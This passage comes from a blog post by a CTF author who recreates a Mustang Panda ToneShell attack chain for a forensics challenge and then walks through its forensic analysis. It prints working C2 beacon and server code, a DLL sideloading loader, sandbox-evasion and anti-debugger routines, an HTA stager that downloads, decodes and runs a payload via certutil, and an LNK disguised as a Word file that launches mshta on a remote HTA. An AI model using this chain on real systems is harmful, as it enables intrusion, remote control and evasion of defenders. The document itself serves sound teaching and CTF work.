}\n    }\n    \n    GUID newGuid;\n    if (CoCreateGuid(&newGuid) != S_OK) {\n        return L\"\";\n    }\n    \n    wchar_t guidString[33];  \n    swprintf(guidString, 33, L\"%08X%04X%04X%02X%02X%02X%02X%02X%02X%02X%02X\",\n             newGuid.Data1, newGuid.Data2, newGuid.Data3,\n             newGuid.Data4[0], newGuid.Data4[1], newGuid.Data4[2], newGuid.Data4[3],\n             newGuid.Data4[4], newGuid.Data4[5], newGuid.Data4[6], newGuid.Data4[7]);\n    \n    std::wofstream outfile(path);\n    outfile \u003C\u003C guidString;\n    outfile.close();\n    \n    return std::wstring(guidString);\n}\n```\nThen a 16-byte guid was made using the function `CoCreateGuid` mentioned in Trend Micro's analysis. After generating, it will then save the output into the file path mentioned earlier.\n\n### Generating the XOR Key\n---\n```c++\nstd::vector\u003Cuint8_t> generateXorKey() {\n    std::vector\u003Cuint8_t> key(XOR_KEY_SIZE);\n    uint32_t tick = GetTickCount();\n    std::mt19937 rng(tick);\n\n    for (size_t i = 0; i \u003C key.size(); i++) {\n        key[i] = rng() & 0xFF;\n    }\n    \n    return key;\n}\n```\n\nNext on the list is the XOR key. Based on the Trend Micro research, it’s generated using a seed derived from the `GetTickCount` function. As the research states that the XOR key is 512 bytes, the size of the XOR key is defined as a constant with the `XOR_KEY_SIZE` variable. With that, the above function is coded through vibe programming. \n\n### Sending the Initial Blob\n---\n```c++\nvoid SendInitialBlob() {\n    uint8_t type = TYPE_VALUE;\n    std::string guidStr(guid.begin(), guid.end());\n    std::vector\u003Cuint8_t> blob;\n    blob.insert(blob.end(), xor_key.begin(), xor_key.end());\n    blob.push_back(type);\n    blob.insert(blob.end(), guidStr.begin(), guidStr.end());\n    blob.insert(blob.end(), xor_key.begin(), xor_key.begin() + XOR_SEED_SIZE);\n\n    if (send(ConnectSocket, reinterpret_cast\u003Cconst char*>(blob.data()), blob.size(), 0) == SOCKET_ERROR) {\n        return;\n    }\n\n    char ackBuffer[4];\n    if (recv(ConnectSocket, ackBuffer, sizeof(ackBuffer), 0) \u003C= 0) {\n        return;\n    }\n}\n```\nWith the XOR key, victim ID, and the seed prepared, the data is combined and sent back to the C2 server as a callback from the beacon. The order of the fields in the blob was explained earlier. However, through vibe programming, the actual seed used to generate the XOR key was not included in the blob. Instead, the first 16 bytes of the XOR key and the size of the seed were added . Oh, how I love vibe programming...\n\n\n> Spoiler alert, writing this function with vibe programming is going to come back to haunt me later during the analysis phase... 🫩🫩\n\n### DLL Sideloading \n---\n```c++\n#include \u003Cwindows.h>\n\ntypedef void (*StartDLLFunc)();\n\nint main() {\n    HINSTANCE hDLL = LoadLibrary(\"LMIGuardianDll.dll\");\n    if (!hDLL) {\n        return 1;\n    }\n\n    StartDLLFunc StartDLL = (StartDLLFunc)GetProcAddress(hDLL, \"StartDLL\");\n    if (!StartDLL) {\n        FreeLibrary(hDLL);\n        return 1;\n    }\n\n    StartDLL();\n\n    FreeLibrary(hDLL);\n    return 0;\n}\n```\n\nThe last part involving the ToneShell DLL is the loader for it. This part was kinda easy... **BUT** of course vibe programming was used. 🤣🤣\n\n\n### Receiving the Initial Blob\n---\n```python\n# Receive the initial blob\nblob_size = XOR_KEY_SIZE + TYPE_SIZE + GUID_SIZE + XOR_SEED_SIZE\ntry:\n    data = receive_all(conn, blob_size)\nexcept ConnectionError as e:\n    print(f\"Error receiving initial blob: {e}\")\n    conn.close()\n    continue  # Wait for a new connection\n\n# Extract components\nxor_key = data[:XOR_KEY_SIZE]\ntype_value = data[XOR_KEY_SIZE]\nguid = data[XOR_KEY_SIZE + TYPE_SIZE:XOR_KEY_SIZE + TYPE_SIZE + GUID_SIZE].decode('ascii', errors='ignore')\nxor_seed = data[-XOR_SEED_SIZE:]\n\nprint(f\"Received XOR key: {xor_key.hex()}\")\nprint(f\"Received Type: {hex(type_value)}\")\nprint(f\"Received GUID: {guid}\")\nprint(f\"Received XOR seed: {xor_seed.hex()}\")\n\n# Send acknowledgment to the client\ntry:\n    conn.sendall(b\"ACK\")\nexcept (socket.error, BrokenPipeError):\n    print(\"Failed to send acknowledgment. Closing connection.\")\n    conn.close()\n    continue  # Wait for a new connection\n```\nFor the ToneShell C2, for simplicity sake, I chose Python as the programming language to host the server. So basically, the ToneShell C2 will wait for a blob to be sent by the beacon. Once it receives data from the beacon, it will split up the data according to the length of the data based on the research by Trend Micro. The details will be printed out and an acknowledgment will be sent to the beacon. Lastly, the attacker can start sending commands to the beacon.\n\n### Sending Commands to the ToneShell Beacon\n---\n```python\nencrypted_command = xor_encrypt_decrypt(command.encode(), xor_key)\ntry:\n    conn.sendall(encrypted_command)\nexcept (socket.error, BrokenPipeError) as e:\n    print(f\"Error sending data to client: {e}\")\n    break  # If sending fails, break the loop\ntry:\n    # Receive the response in chunks\n    result = b\"\"\n    while True:\n        chunk = conn.recv(4096)\n        if not chunk:\n            break  # No more data\n        result += chunk\n        if len(chunk) \u003C 4096:\n            break  # Assume all data has been received\n\n    if not result:\n        print(\"Client disconnected.\")\n        break  # If no data is received, assume client disconnected\n\n    decrypted_result = xor_encrypt_decrypt(result, xor_key).strip()\n    print(\"Received output:\")\n    print(decrypted_result.decode(errors='ignore'))\nexcept (socket.error, ConnectionResetError) as e:\n    print(f\"Error receiving data from client: {e}\")\n    break  # If receiving fails, break the loop (client may have disconnected)\nexcept socket.timeout:\n    print(\"Timed out waiting for client response.\")\n    break\n```\nHowever, before sending the commands, the server will encrypt the command with the XOR key received. The response received will also be encrypted with the same XOR key generated by the beacon. The server will then decrypt the data received.\n\nThese are the main parts of the ToneShell C2 and Beacon, I know it's not that sophisticated and I realised it from the start. However, I surprised myself during the analysis of my own beacon and loader.\n\n![It ain't much but it's honest work](../assets/recreating-an-apt-attack/work.jpg)\n\n## Building the 3rd Stager\n---\n\n### String Encryption\n---\n```c++\n#include \u003Ciostream>\n#include \u003Cqueue>\n#include \u003Cunordered_map>\n#include \u003Cvector>\n#include \u003Cstring>\n#include \u003Cfstream>\n#include \u003Csstream>\n#include \u003Ciomanip>\nusing namespace std;\n\n// A Huffman Tree Node\nstruct Node {\n    char ch;\n    int freq;\n    Node* left, * right;\n\n    Node(char character, int frequency) {\n        ch = character;\n        freq = frequency;\n        left = right = nullptr;\n    }\n};\n\n// Compare function for priority queue\nstruct Compare {\n    bool operator()(Node* left, Node* right) {\n        return left->freq > right->freq;\n    }\n};\n\n// Traverse the Huffman Tree and store Huffman Codes in a map\nvoid encode(Node* root, string str, unordered_map\u003Cchar, string>& huffmanCode) {\n    if (!root)\n        return;\n\n    // If it's a leaf node\n    if (!root->left && !root->right) {\n        huffmanCode[root->ch] = str;\n    }\n\n    encode(root->left, str + \"0\", huffmanCode);\n    encode(root->right, str + \"1\", huffmanCode);\n}\n\n// Traverse the Huffman Tree and decode the encoded string\nstring decode(Node* root, string encodedString) {\n    string decoded = \"\";\n    Node* current = root;\n    for (char bit : encodedString) {\n        if (bit == '0') {\n            current = current->left;\n        }\n        else {\n            current = current->right;\n        }\n\n        // If it's a leaf node\n        if (!current->left && !current->right) {\n            decoded += current->ch;\n            current = root;\n        }\n    }\n    return decoded;\n}\n\n// Convert a string to its hexadecimal representation\nstring toHex(const string& input) {\n    stringstream hexStream;\n    for (unsigned char c : input) {\n        hexStream \u003C\u003C hex \u003C\u003C setw(2) \u003C\u003C setfill('0') \u003C\u003C (int)c;\n    }\n    return hexStream.str();\n}\n\n// Convert a hexadecimal string back to its original string\nstring fromHex(const string& hexInput) {\n    stringstream input(hexInput);\n    stringstream output;\n    while (input.good()) {\n        string byte;\n        input >> setw(2) >> byte;\n        if (byte.empty()) break;\n        char ch = stoi(byte, nullptr, 16);\n        output \u003C\u003C ch;\n    }\n    return output.str();\n}\n\n// Save the Huffman Tree to a string\nvoid saveTree(Node* root, stringstream& out) {\n    if (!root) {\n        out \u003C\u003C \"# \"; // Marker for null\n        return;\n    }\n    out \u003C\u003C root->ch \u003C\u003C \" \" \u003C\u003C root->freq \u003C\u003C \" \";\n    saveTree(root->left, out);\n    saveTree(root->right, out);\n}\n\n// Load the Huffman Tree from a stringstream\nNode* loadTree(stringstream& in) {\n    string value;\n    in >> value;\n    if (value == \"#\") {\n        return nullptr; // Null marker\n    }\n\n    char ch = value[0];\n    int freq;\n    in >> freq;\n    Node* node = new Node(ch, freq);\n    node->left = loadTree(in);\n    node->right = loadTree(in);\n    return node;\n}\n\nint main() {\n    string text;\n    cout \u003C\u003C \"Enter the string to encode: \";\n    getline(cin, text);\n\n    // Count frequency of characters\n    unordered_map\u003Cchar, int> freq;\n    for (char ch : text) {\n        freq[ch]++;\n    }\n\n    // Create a priority queue to store live nodes of the Huffman Tree\n    priority_queue\u003CNode*, vector\u003CNode*>, Compare> pq;\n\n    // Create a leaf node for each character and add it to the priority queue\n    for (auto pair : freq) {\n        pq.push(new Node(pair.first, pair.second));\n    }\n\n    // Build the Huffman Tree\n    while (pq.size() != 1) {\n        // Remove the two nodes of the highest priority (lowest frequency)\n        Node* left = pq.top();\n        pq.pop();\n        Node* right = pq.top();\n        pq.pop();\n\n        // Create a new internal node with these two nodes as children\n        // and frequency equal to the sum of the two nodes' frequencies\n        Node* sumNode = new Node('\\0', left->freq + right->freq);\n        sumNode->left = left;\n        sumNode->right = right;\n        pq.push(sumNode);\n    }\n\n    // Root of the Huffman Tree\n    Node* root = pq.top();\n\n    // Traverse the Huffman Tree and store the codes in a map\n    unordered_map\u003Cchar, string> huffmanCode;\n    encode(root, \"\", huffmanCode);\n\n    cout \u003C\u003C \"\\nHuffman Codes:\\n\";\n    for (auto pair : huffmanCode) {\n        cout \u003C\u003C pair.first \u003C\u003C \" \" \u003C\u003C pair.second \u003C\u003C \"\\n\";\n    }\n\n    // Encode the input text\n    string encodedString = \"\";\n    for (char ch : text) {\n        encodedString += huffmanCode[ch];\n    }\n\n    cout \u003C\u003C \"\\nEncoded String:\\n\" \u003C\u003C encodedString \u003C\u003C \"\\n\";\n\n    // Save the Huffman Tree to a string\n    stringstream treeStream;\n    saveTree(root, treeStream);\n    string treeString = treeStream.str();\n\n    // Convert the tree and encoded string to hex\n    string treeHex = toHex(treeString);\n    string encodedHex = toHex(encodedString);\n\n    cout \u003C\u003C \"\\nHuffman Tree (Hex):\\n\" \u003C\u003C treeHex \u003C\u003C \"\\n\";\n    cout \u003C\u003C \"Encoded String (Hex):\\n\" \u003C\u003C encodedHex \u003C\u003C \"\\n\";\n\n    // Take tree and encoded string as input instead of reading from files\n    cout \u003C\u003C \"\\nEnter Huffman Tree (Hex): \";\n    string inputTreeHex;\n    cin >> inputTreeHex;\n\n    cout \u003C\u003C \"Enter Encoded String (Hex): \";\n    string inputEncodedHex;\n    cin >> inputEncodedHex;\n\n    // Convert hex back to original data\n    string loadedTreeString = fromHex(inputTreeHex);\n    string loadedEncodedString = fromHex(inputEncodedHex);\n\n    // Reconstruct the tree\n    stringstream loadedTreeStream(loadedTreeString);\n    Node* loadedTree = loadTree(loadedTreeStream);\n\n    // Decode the loaded encoded string\n    string decodedString = decode(loadedTree, loadedEncodedString);\n\n    cout \u003C\u003C \"\\nDecoded String:\\n\" \u003C\u003C decodedString \u003C\u003C \"\\n\";\n\n    return 0;\n}\n```\n\nNow, during my research for this challenge, I do not know how did the real loader work for that specific attack. For that reason, I decided to create my own loader! Sounds exciting right?! Yeah, try telling me that months ago when I was vibe coding with DeepSeek and ChatGPT, just trying to get the loader and DLL to work 😵‍💫.\n\nAnyway, whenever I'm creating malware challenges, I always consider how participants will analyse the malware. The first tools that come to mind are `strings` and `floss`, which are perfect for locating visible strings within the executable. Naturally, I had to ask a professional how typical malware hides strings, because if they figured out the encryption method, they'd be able to decrypt the strings. His suggestion was as follows:\n\n>**Malware Professional:** Maybe you can implement more stager payload, packed it with harder packer, shellcode, compression, and many moree\n\nAs he said that, the word *compression* kept replaying in my mind. I remembered a malware analyst mentioning how she spent days analysing a sample, initially thinking it was an encryption method, only to later realise it was actually a compression function. So, that led me thinking, can I compress a string? The answer was yes. The source code you see above here is actually the function for Huffman Encoding. This was one of the topics that was taught during my university days and I finally found a use for it!\n\n> I know it's Huffan \"Encoding\", but we were taught this was how a string can be represented through so called \"compression\".\n\nThe code begins by defining a `Node` structure to represent each node in the Huffman tree, which holds a character, its frequency, and pointers to its left and right children. A `priority_queue` stores nodes based on their frequency, with the least frequent nodes given the highest priority. The tree is built by repeatedly combining the two least frequent nodes until only one node remains, which becomes the root.\n\nThe program then generates Huffman codes by traversing the tree and assigning each character a unique binary code. These codes are stored in a map, and the input string is encoded using them. The encoded string is then displayed to the user. The Huffman tree and the encoded string is then serialised into a string, which is converted into hexadecimal format for easier storage. \n\nWith this in place, the strings will be effectively encrypted. Anyone attempting to decrypt the strings found within the loader would need to understand the function itself, rather than relying on the usual methods like XOR keys or AES encryption for decryption. So, I proceeded to hide the URLs hosting the DLL and the executable to run the DLL.\n\n### Sandbox Evasion Implemented\n---\n\nFrom observing how Blue Teamers usually tackle malware challenges, I know they either run it through VirusTotal or directly within their virtual machine. So, to prevent these tactics from being used, I thought of implementing Sandbox Evasion into the loader.\n\nMustang Panda has previously attack the following countries:\n- Australia\n- Bangladesh\n- Belgium\n- Bulgaria\n- China\n- Cyprus\n- Czech\n- Ethiopia\n- France\n- Germany\n- Greece\n- Hong Kong\n- Hungary\n- India\n- Indonesia\n- Japan\n- Mongolia\n- Myanmar\n- Nepal\n- Pakistan\n- Philippines\n- Russia\n- Singapore\n- Slovakia\n- South Africa\n- South Korea\n- South Sudan\n- Sweden\n- Taiwan\n- Thailand\n- Tibet\n- UK\n- USA\n- Vietnam\n\nSince these were the countries targeted by Mustang Panda, it makes sense that the malware would operate within these regions. Therefore, I implemented a function to check whether the user's timezone is set to Japan.\n\n```c++\nbool isInJapanTimezone()\n{\n    TIME_ZONE_INFORMATION timeZoneInfo;\n    GetTimeZoneInformation(&timeZoneInfo);\n\n    if (wcsstr(timeZoneInfo.StandardName, L\"Tokyo\") != NULL || \n        wcsstr(timeZoneInfo.StandardName, L\"Osaka\") != NULL || \n        wcsstr(timeZoneInfo.StandardName, L\"Sapporo\") != NULL || \n        wcsstr(timeZoneInfo.StandardName, L\"Japan\") != NULL)\n    {\n        return true;\n    }\n    return false;\n}\n```\n\nThis function checks if the system's timezone is set to Japan's timezone. It does this by looking for certain words in the timezone's name, such as \"Tokyo,\" \"Osaka,\" \"Sapporo,\" or \"Japan.\" It gets the system's timezone information and then checks if the name contains any of these words. If it finds one, it returns true, meaning the system is likely in Japan's timezone. If none of these words are found, it returns false, meaning the system is not in Japan's timezone.\n\n\n### Anti-Debuggers Implemented\n---\n\n```c++\n\nbool isDebuggerProcessRunning()\n{\n    const char* debuggerProcesses[] = {\n        \"x32dbg.exe\", \"x64dbg.exe\", \"ollydbg.exe\", \"windbg.exe\", \"ida.exe\", \"ida64.exe\",\n        \"idaq.exe\", \"idaq64.exe\", \"procmon.exe\", \"filemon.exe\", \"regmon.exe\", \"tcpview.exe\",\n        \"wireshark.exe\", \"sandboxie.exe\", \"cuckoo.exe\"\n    };\n\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (hSnap == INVALID_HANDLE_VALUE) {\n        return false;\n    }\n\n    PROCESSENTRY32 pe;\n    pe.dwSize = sizeof(PROCESSENTRY32);\n\n    if (Process32First(hSnap, &pe)) {\n        do {\n            for (const char* processName : debuggerProcesses) {\n                if (_stricmp(pe.szExeFile, processName) == 0) {\n                    CloseHandle(hSnap);\n                    return true;\n                }\n            }\n        } while (Process32Next(hSnap, &pe));\n    }\n\n    CloseHandle(hSnap);\n    return false;\n}\n\nbool isDebuggerWindowOpen()\n{\n    LPCWSTR debuggerWindows[] = {\n        L\"x32dbg\", L\"x64dbg\", L\"OllyDbg\", L\"Immunity Debugger\", L\"WinDbg\",\n        L\"IDA\", L\"IDA Pro\", L\"idaq\", L\"idaq64\",\n        L\"Process Monitor\", L\"procmon\",\n        L\"Wireshark\", L\"TCPView\", L\"Network Monitor\",\n        L\"Filemon\", L\"Regmon\",\n        L\"Sandboxie\", L\"Cuckoo Sandbox\"\n    };\n\n    for (LPCWSTR windowTitle : debuggerWindows)\n    {\n        if (FindWindowW(NULL, windowTitle)) {\n            return true;\n        }\n    }\n    return false;\n}\n\nvoid monitorDebugger() {\n    while (true) {\n        if (isDebuggerProcessRunning()) {\n            exit(-1);\n        }\n        if (isDebuggerWindowOpen()) {\n            exit(-1);\n        }\n        Sleep(1000);\n    }\n}\n```\n\nAnother way Blue Teamers tackle malware challenges is by debugging them. So, let's take that ability away from them by implementing anti-debuggers.\n\nThe `isDebuggerProcessRunning()` function checks if any known debugger processes are running on the system. It defines a list of debugger process names, such as \"x32dbg.exe\" and \"ollydbg.exe.\" It then takes a snapshot of all running processes on the system using `CreateToolhelp32Snapshot`. It checks each process in the snapshot, comparing the process name against the list of known debugger names. If any of the processes match, the function returns true, indicating that a debugger is running. If no matches are found, it returns false. The function uses `Process32First` and `Process32Next` to iterate through the processes, and closes the handle to the snapshot before returning the result.\n\nThe `isDebuggerWindowOpen()` function checks if any known debugger windows are open. It defines a list of debugger window titles, such as \"x32dbg\" and \"IDA Pro.\" The function uses `FindWindowW` to search for any windows with titles that match the ones in the list. If it finds a window with a matching title, it returns true, indicating that a debugger window is open. If no matching windows are found, it returns false. \n\nLastly, the `monitorDebugger()` function continuously monitors for the presence of debugger processes or debugger windows. It runs in an infinite loop and checks both conditions by calling `isDebuggerProcessRunning()` and `isDebuggerWindowOpen()`. If either of these functions return true, meaning a debugger is detected, it immediately calls `exit(-1)` to stop the program and terminate execution. If no debugger is detected, the function waits for one second (`Sleep(1000)`) before checking again.\n\nAfter compiling the 3rd stager, I archived the file in a `.cab` file and encoded it as a certificate file using the following commands:\n\n```bash\n# Archiving the 3rd stager\nmakecab musangking.exe wct9039.tmp\n\n# Encoding it as a certificate file\nopenssl base64 -in wct9039.tmp -out wct9039.jpg\n```\n\nBy checking if the user is in Japan and if a debugger is running, the challenge forces participants to understand how the malware works and how to get around these restrictions. I had to learn this myself while making the challenge, so I thought, why not let the participants learn from it too?\n\n\n## Building the 2nd Stager\n---\n```html {\"This line was modified from the original source\":37-38}\n\u003C!DOCTYPE html>\n\u003Chtml>\n\u003Chead>\n\u003CHTA:APPLICATION ID=\"SI\"\nAPPLICATIONNAME=\"Downloader\"\nWINDOWSTATE=\"minimize\"\nMAXIMIZEBUTTON=\"no\"\nMINIMIZEBUTTON=\"no\"\nCAPTION=\"no\"\nSHOWINTASKBAR=\"no\">\n\n\u003Cscript>\nfunction XLKJSDGOODGOGOGO(xaksldfjifjglka) {\n    a = new ActiveXObject(\"Wscript.Shell\");\n    a.Run(xaksldfjifjglka, 0);\n}\n\nfunction OCKJOIFJIOGGOGOGO(xaksldfjifjglka) {\n    b = new ActiveXObject(\"Wscript.Shell\");\n    b.Run(xaksldfjifjglka, 0);\n}\n\nfunction liociaskdjlkdlakfk(xaksldfjifjglka) {\n    c = new ActiveXObject(\"Wscript.Shell\");\n    c.Run(xaksldfjifjglka, 0);\n}\n\nfunction LSJDIJLKDJOGOGOGO(n) {\n    var d = new ActiveXObject(\"WScript.Shell\");\n    d.Run(\"%comspec% /c ping -n \" + n + \" 127.0.0.1 > nul\", 0, 1);\n}\n\nXLKJSDGOODGOGOGO(\"http://192.168.88.131/images/musangking.png\");\n\nLSJDIJLKDJOGOGOGO(10);\n\n// ...\nXLKJSDGOODGOGOGO(\"certutil.exe -f -urlcache \\\"http://192.168.88.131/pt/wct9039.jpg\\\" \\\"C:\\\\Users\\\\Public\\\\Documents\\\\wct9039.jpg\\\"\");\n\nLSJDIJLKDJOGOGOGO(20);\n\nOCKJOIFJIOGGOGOGO(\"certutil.exe -decode \\\"C:\\\\Users\\\\Public\\\\Documents\\\\wct9039.jpg\\\" \\\"C:\\\\Users\\\\Public\\\\Documents\\\\wct9039.tmp\\\"\");\n\nLSJDIJLKDJOGOGOGO(10);\n\nOCKJOIFJIOGGOGOGO(\"expand C:\\\\Users\\\\Public\\\\Documents\\\\wct9039.tmp -f:* C:\\\\Users\\\\Public\\\\Videos\\\\winp.exe\");\n\nLSJDIJLKDJOGOGOGO(5);\n\nliociaskdjlkdlakfk(\"cmd /c C:\\\\Users\\\\Public\\\\Videos\\\\winp.exe\");\n\n\u003C/script>\n\u003C/head>\n\u003Cbody>\n\u003C/body>\n\u003C/html>\n```\n\nThe 2nd stager was easy to replicate since the source code was provided in the research, although I had to use zoom tool to see the source code. However, the only change I made to the source code is the one highlighted above. The reason for this change will be explained during the analysis phase.\n\nThe 2nd stager is just a simple HTML Application (HTA) file that runs commands using Windows Script Host. HTA files are similar to HTML but are allowed to run scripts with higher privileges on Windows. The script shown is able to hide the application window by setting it to minimise, removing the title bar, and not showing it in the taskbar, making it less noticeable when it runs.\n\nThe script defines several functions that each use `ActiveXObject(\"WScript.Shell\")` to run system commands. Although the functions have different names, they all do the same thing. They take a command as input and run it silently in the background using the Windows command line. Another function, `LSJDIJLKDJOGOGOGO`, adds a delay by using the ping command to pause the script for a specific number of seconds. This helps space out the actions so they do not all happen too quickly or at once.\n\nAfter defining the functions, the script first accesses `http://192.168.88.131/images/musangking.png`. This basically loads and image, tricking the user to think that they just opened an image file. Then, it waits for 10 seconds before downloading a file named **wct9039.jpg** using `certutil`, a built-in Windows utility that can download files from the internet. It stores the file in the public documents folder.\n\nAfter a 20-second wait, the script decodes the downloaded `.jpg` file into a `.tmp` file. After another short delay, the `.tmp` file is extracted using the `expand` command into an executable file called `winp.exe`, saved in the public videos folder. Finally, the script waits a bit more, then runs `winp.exe` using the command line. \n\nWith all the components ready, the last step is to create a shortcut file that the victim will click.\n\n## Building the 1st Stager\n---\n![Image of inserting the payload into the LNK file](../assets/recreating-an-apt-attack/inserting_payload.png)\n\nThe last stager is the easiest to create, and don't worry, there won't be any vibe programming here 🤣🤣. Within the Desktop, right click and click on *New* and followed by *Shortcut*. A wizard (not that kind) will then appear and prompt you to insert where the shortcut file will point to. This is where the following payload is inserted:\n```\n%SystemRoot%\\system32\\mshta.exe http://192.168.88.131/Queen/M.hta\n```\n\n![Image of naming the LNK file](../assets/recreating-an-apt-attack/naming_file.png)\n\nAfter that, the wizard will ask you to name the file.\n\n\n![Image of changing the LNK file's icon ](../assets/recreating-an-apt-attack/choosing_icon.png)\n\nThen assuming the victim uses the same version of Microsoft Office as the attacker... Yes, it is not the best OPSEC. The shortcut file's icon can be changed by modifying its icon properties into this file:\n```\nC:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WORDICON.EXE\n```\n\n\n## Attack Simulation and ToneShell C2 Demonstration\n---\n\n\u003CVimeo id=\"https://vimeo.com/1081488435\" /> \n\nWith the components all ready and hosted in the right location with Wireshark running in the background, this is the demonstration of the whole attack from start to finish. \n\n> Yes, I know the C2 server is a bit broken but as I already mentioned, I'm a noob, not an APT member...\n\n\n## Forensics Analysis\n---\n\nWith the attack fully simulated, a Forensic Triage was taken from the victim machine with KAPE and the packet capture file from Wireshark is saved.\n\n### Malicious LNK File (1st Stager)\n---\n![Image of a suspicious LNK file](../assets/recreating-an-apt-attack/sus_file.png)\n\nThe first clue that participants might find when looking for possible IOCs is in `C:\\Users\\user\\Desktop`. There, they will see a file called `Musang King.docx`. At first, it looks like a normal Word document, but if they look closely, they will notice it is actually a shortcut file (LNK). This can be seen from the small arrow on the bottom left of the file icon. This means the file could be set up to run another program or command.\n\n![Image of the contents of the LNK file](../assets/recreating-an-apt-attack/lnk_content.png)\n\nBy checking the file’s properties, you can see the path that the LNK file is pointing to. It runs the following command:\n```plaintext\nC:\\Windows\\System32\\mshta.exe http://192.168.88.131/Queen/M.hta\n```\n\n#### Last Executed Application\n---\n\n![Image of the Prefetch files](../assets/recreating-an-apt-attack/prefetch.png)\n\nHowever, going to the URL from the command reveals nothing at all. Also, it is clear that `M.hta` was never meant to be recovered. With that said, the only thing to go on off is the execution of `mshta.exe`. With this is worth investigating prefetch files to see what program was last executed. Windows prefetch files are created automatically by the system to help programs start more quickly. They keep track of what files and resources a program uses when it runs. These `.pf` files are stored in `C:\\Windows\\Prefetch` and contain details like the name of the program, how many times it has been run, the last time it was used, and which files it accessed.\n\n![Image of the parsing Prefetch files](../assets/recreating-an-apt-attack/parsed_prefetch.png)\n\nPrefetch files can be analysed using a tool by Eric Zimmerman called PECmd. To use it, you can run the following command:\n```plaintext\n& 'C:\\DFIR Tools\\PECmd\\PECmd.exe' -d 'musangking\\C\\Windows\\prefetch' --csv PECmd_musangking --csvf PECmd.csv\n```\nThis command will parse all the prefetch files within the specified directory using the `-d` switch. The `--csv` switch will output the results in a folder named *PECmd_musangking*, and the `--csvf` switch will ensure that the output file is named *PECmd.csv*.\n\n![Image of the timeline after mshta.exe was executed](../assets/recreating-an-apt-attack/mshta_execution.png)\n\nBy examining the results with Timeline Explorer and searching for `mshta.exe`, it shows that after it was executed, several other processes were triggered, including `certutil.exe`, `cmd.exe`, and `ping.exe`. These executions suggest these were the results of the `M.hta` script.\n\n#### Certutil Cached Content\n---\n![Image of certutil related files](../assets/recreating-an-apt-attack/certutil_folders.png)\n\nWhen building the 2nd stager, I mentioned that I changed a line from the original script found in the research. The original script uses `curl.exe` to download the 3rd stager. However, since this is a CTF, I needed the file to be recoverable. So, I used `certutil.exe` with the `-urlcache` switch instead. The `-urlcache` option in the `certutil.exe` command downloads a file from a URL and saves it in the system's cache. Even if the file is deleted later, it can still be found in the cache. The cache files for `certutil` can be found within `C:\\Users\\user\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache`.\n\n![Image of a suspicious file's metadata](../assets/recreating-an-apt-attack/file_metadata.png)\n\nInside the Metadata folder, you can find the metadata for all the files downloaded using `certutil.exe`. To save time, the file you should focus on is `DFF9F3FC83193D7B000F4C64559EC76B`.\n\n![Image of a suspicious file's name](../assets/recreating-an-apt-attack/file_metadata_content.png)\n\nBy using `strings`, the metadata revealed that the same IP address appeared again. However, this time, it requested a different file, `wct9039.jpg`.\n\n![Image of the actual suspicious file](../assets/recreating-an-apt-attack/actual_file.png)\n\nIf you go back one directory and enter the `Content` folder, you can find the file with the same name as the metadata, `DFF9F3FC83193D7B000F4C64559EC76B`. This is the file that was downloaded and can now be recovered.\n\n#### CAB File Disguised as Certificate File\n---\n![Image of the actual suspicious file's content](../assets/recreating-an-apt-attack/actual_file_content.png)\n\nThe contents of the file appear to be a certificate file.\n\n![Image of the decoding the suspicious file ](../assets/recreating-an-apt-attack/decode_file.png)\n\nHowever, based on the context from the metadata, the file could be masquerading to be a certificate file. For this reason, `certutil` can be used again to decode the file.\n\n![Image of the file type](../assets/recreating-an-apt-attack/decoded_file_type.png)\n\nUsing Detect It Easy (DIE), the file type can be determined. It seems to be a Microsoft Cabinet File. A Microsoft Cabinet file usually with the `.cab` extension is a compressed archive format used by Microsoft to store and distribute files, such as software, system updates, and drivers. It allows multiple files to be packaged together using lossless compression, ensuring that the original files can be fully restored when extracted. Cabinet files are commonly used for Windows installations and updates and can be opened with built-in Windows tools.\n\n![Image of expand.exe excuted](../assets/recreating-an-apt-attack/expand_execution.png)\n\nLooking back at the prefetch results, it is shown that `expand.exe` was executed. `expand.exe` is a command-line utility in Windows used to extract files from Microsoft Cabinet files. It enables users to decompress and extract individual files or the entire contents of a `.cab` archive. The extracted files can be placed in a specified location.\n\n![Image of expanding the .cab file](../assets/recreating-an-apt-attack/expand_file.png)\n\nUsing the same tool, the files within the `.cab` file were extracted.\n\n![Image of the extracted file's file type](../assets/recreating-an-apt-attack/extracted_file_type.png)\n\nUsing DIE again, the file appears to be a 64-bit executable compiled in Visual Studio. The program is written in C or C++.\n\n### Anti-Debugging & Sandbox Evasion (3rd Stager)\n---\n![Image of the 3rd stager on VirusTotal](../assets/recreating-an-apt-attack/stager_3_detection.png)\n\nHere is the crazy part. I uploaded the stager to VirusTotal and only 1 out of 72 engines flagged it. How wild is that?! Not only that, I also managed to bypass dynamic analysis. If I had to pick my top achievements, this would definitely be one of them.\n\n![Image of the main function of the stager](../assets/recreating-an-apt-attack/main_function.png)\n\nLooking at the `main` function, we can see the encrypted strings that were added to the stager. The function begins by creating a new thread using the `CreateThread` function, which runs the `StartAddress` function. After that, it calls the `sub_140001450` function, and if that function does not return `true`, the program will exit. If it does return `true`, the program continues to run as normal.\n\n\n![Image of a function calling 2 anti-debugger functions](../assets/recreating-an-apt-attack/anti_debug_loop.png)\n\nLooking into the `StartAddress` function, we can see that it contains an infinite loop that calls the `sub_1400010C0` and `sub_1400012B0` functions. If `sub_1400010C0` does not return `false`, the program will exit. If it returns `false`, the program proceeds to call `sub_1400012B0`. If `sub_1400012B0` returns `true`, the program exits. Otherwise, the execution pauses for 1 second and the loop repeats.\n\n![Image of 1st anti-debugger function](../assets/recreating-an-apt-attack/process_anti_debug.png)\n\nLooking into `sub_1400010C0`, the function takes a snapshot of the currently running processes on the system. It then checks these processes against a list of known debuggers. If any debugger is found in the list, the function returns `true`. If no debugger is found, it returns `false`.\n\n![Image of 2nd anti-debugger function](../assets/recreating-an-apt-attack/window_anti_debug.png)\n\nSimilar to the `sub_1400010C0` function, `sub_1400012B0` checks the window titles of currently running programs. It compares them against a list of known debugger window titles. If a match is found, it returns `true`. If no match is found, it returns `false`.\n\n![Image of a function checking for time zone](../assets/recreating-an-apt-attack/timezone_sandbox_evasion.png)\n\nWithin `sub_140001450`, the function uses the `GetTimeZoneInformation` API to get the current time zone settings of the system. It then checks if the time zone matches Japan's time zone and returns `true` if it does, or `false` if it does not.\n\n![Image of the files dropped from the 3rd stager](../assets/recreating-an-apt-attack/probable_artefacts.png)\n\nSkipping to the end of the `main` function, we can see that two files are referenced, `LMIGuardianDll.dll` and 